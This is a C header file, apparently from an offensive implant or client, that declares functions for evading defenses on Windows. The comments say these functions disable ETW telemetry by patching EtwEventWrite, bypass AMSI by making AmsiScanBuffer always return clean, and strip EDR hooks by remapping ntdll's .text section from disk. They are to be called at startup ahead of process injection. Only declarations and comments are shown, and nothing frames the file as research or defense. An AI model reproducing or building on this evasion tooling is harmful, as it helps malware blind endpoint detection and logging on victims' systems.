/*
 * client/evasion.h  –  User-mode evasion primitives
 * ==================================================
 *
 *  etw_patch()
 *      Patches EtwEventWrite in the in-process ntdll copy so it returns
 *      immediately.  Stops Windows Event Tracing (ETW) telemetry emitted
 *      by this process from reaching any consumer (EDR, WEF, Defender).
 *
 *  amsi_patch()
 *      Patches AmsiScanBuffer in amsi.dll so it always returns
 *      AMSI_RESULT_CLEAN (1).  Prevents PowerShell / WSH / .NET AMSI
 *      scanning of in-process content.  No-op if amsi.dll is not loaded.
 *
 *  unhook_ntdll()
 *      Remaps a fresh copy of ntdll.dll from disk over the in-process
 *      copy, restoring any IAT/inline hooks placed by EDR products.
 *      Only the .text section is remapped (read-only data is left alone).
 */

#pragma once
#ifndef CLIENT_EVASION_H
#define CLIENT_EVASION_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Patch EtwEventWrite → ret.  Call once at startup. */
void etw_patch(void);

/* Patch AmsiScanBuffer → AMSI_RESULT_CLEAN.  Call once at startup. */
void amsi_patch(void);

/*
 * Remap ntdll.dll .text from disk, overwriting any EDR inline hooks.
 * Call once at startup, before inject_init() resolves NT pointers
 * (so the restored syscall stubs are used from that point on).
 */
void unhook_ntdll(void);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_EVASION_H */
